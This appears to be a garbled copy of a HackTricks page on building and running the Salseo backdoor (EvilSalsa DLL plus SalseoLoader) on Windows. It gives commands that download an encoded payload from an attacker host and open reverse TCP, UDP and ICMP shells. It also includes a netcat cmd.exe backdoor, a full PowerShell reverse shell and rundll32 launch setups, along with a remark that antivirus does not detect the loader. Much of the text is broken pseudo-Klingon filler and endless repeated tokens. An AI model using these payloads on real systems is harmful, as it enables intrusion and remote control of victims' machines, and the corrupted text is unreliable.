# Salseo

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Compiling the binaries

Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.

Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).

You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**

(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Prepare the Backdoor

First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

##### Salseo - Backdoors

###### Salseo - Backdoors - Windows

###### Salseo - Backdoors - Windows - Netcat

Netcat is a versatile tool that can be used to create backdoors on Windows systems. It allows for remote access and control of a compromised machine. Here's how you can use Netcat to create a backdoor on a Windows system:

1. Download Netcat for Windows from the official website.
2. Open a command prompt and navigate to the directory where Netcat is located.
3. Use the following command to create a backdoor:

   ```
   nc -lvp <port> -e cmd.exe
   ```

   Replace `<port>` with the desired port number for the backdoor.

4. Once the command is executed, Netcat will start listening on the specified port.
5. Now, you can connect to the backdoor using Netcat from another machine:

   ```
   nc <target_ip> <port>
   ```

   Replace `<target_ip>` with the IP address of the compromised machine and `<port>` with the port number used for the backdoor.

6. After connecting to the backdoor, you will have remote access to the compromised machine's command prompt.

Note: It's important to use this technique responsibly and only on systems that you have proper authorization to access. Unauthorized use of backdoors is illegal and unethical.

###### Salseo - Backdoors - Windows - PowerShell

PowerShell is a powerful scripting language that can be used to create backdoors on Windows systems. It provides extensive functionality for remote access and control. Here's how you can use PowerShell to create a backdoor on a Windows system:

1. Open a PowerShell session on the target Windows system.
2. Use the following command to create a reverse shell backdoor:

   ```powershell
   $client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <attacker_port>)
   $stream = $client.GetStream()
   [byte[]]$bytes = 0..65535|%{0}
   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
       $sendback = (iex $data 2>&1 | Out-String )
       $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
       $stream.Write($sendbyte,0,$sendbyte.Length)
       $stream.Flush()
   }
   $client.Close()
   ```

   Replace `<attacker_ip>` with the IP address of the machine you want to connect from and `<attacker_port>` with the desired port number for the backdoor.

3. Once the command is executed, the target system will establish a connection to the specified IP address and port.
4. Now, you can interact with the backdoor by sending commands from the machine you connected from.

Note: As with any hacking technique, it's important to use PowerShell backdoors responsibly and with proper authorization. Unauthorized use of backdoors is illegal and unethical.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Qap, DaH jImej Salseo vItlhutlh: **EvilDalsa.dll** **encoded** je **SalseoLoader** **binary**. 

**SalseoLoader.exe binary** **machine** **upload**. **AV** **detect** **not**.

## **backdoor** **Execute**

### **TCP reverse shell (HTTP through encoded dll download)**

**nc** **reverse shell listener** **start** je **HTTP server** **encoded evilsalsa** **serve** **Remember**.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Getting a UDP reverse shell (downloading encoded dll through SMB)**

**ghItlhvam nc vItlhutlh.** (Remember to start a nc as the reverse shell listener.)

**'ej SMB Server vItlhutlh encoded evilsalsa (impacket-smbserver) vItlhutlh.** (And serve the encoded evilsalsa through an SMB server.)
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **tlhIngan Hol**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!**

**ghu'vam, vItlhutlh! vaj vItlhutlh!
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Qapla' 'e' vItlhutlh!:

```bash
$ ./client
```

#### Execute the server:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### jIHDaq vItlhutlh, Salseo vItlhutlh:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compiling SalseoLoader as DLL exporting main function

Visual Studio jIyajbe' SalseoLoader project.

### Add before the main function: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Install DllExport for this project

#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In your project folder have appeared the files: **DllExport.bat** and **DllExport\_Configure.bat**

### **U**ninstall DllExport

Press **Uninstall** (yeah, its weird but trust me, it is necessary)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Exit Visual Studio and execute DllExport\_configure**

Just **exit** Visual Studio

Then, go to your **SalseoLoader folder** and **execute DllExport\_Configure.bat**

Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Open the project again with visual Studio**

**\[DllExport]** should not be longer marked as error

![](<../.gitbook/assets/image (8) (1).png>)

### Build the solution

Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

![](<../.gitbook/assets/image (10) (1).png>)

Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)

### Test the generated Dll

Copy and paste the Dll where you want to test it.

Execute:
```
rundll32.exe SalseoLoader.dll,main
```
**ghItlh** **DI'** **error** **lo'laH** **ghap** **'e'** **chu'** **vaj** **DLL** **QaQ** **vay'** **chu'** **'e'** **DI'** **ghap** **'e'** **chu'** **vaj** **DLL** **QaQ** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'**
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD provides a wide range of commands that can be used to perform various tasks, such as navigating through directories, managing files and processes, configuring network settings, and more.

CMD is a powerful tool for both legitimate users and hackers. It can be used to execute malicious commands and carry out various hacking activities. Hackers can leverage CMD to gain unauthorized access to systems, escalate privileges, execute remote commands, and perform other malicious actions.

As a hacker, it is important to have a good understanding of CMD and its capabilities. By mastering CMD, you can effectively exploit vulnerabilities, gain control over systems, and carry out successful attacks. However, it is crucial to use this knowledge responsibly and ethically, adhering to legal and ethical guidelines.

Here are some common CMD commands that hackers often use:

- **dir**: Lists the files and directories in the current directory.
- **cd**: Changes the current directory.
- **copy**: Copies files from one location to another.
- **del**: Deletes files.
- **netstat**: Displays active network connections.
- **ipconfig**: Displays IP configuration information.
- **tasklist**: Lists all running processes.
- **taskkill**: Terminates a running process.
- **regedit**: Opens the Windows Registry Editor.
- **ping**: Sends ICMP echo requests to a specified IP address.

These are just a few examples of the many commands available in CMD. As a hacker, it is important to explore and understand the full range of CMD commands to maximize your hacking capabilities. Remember to always use your skills responsibly and ethically.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlhutlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
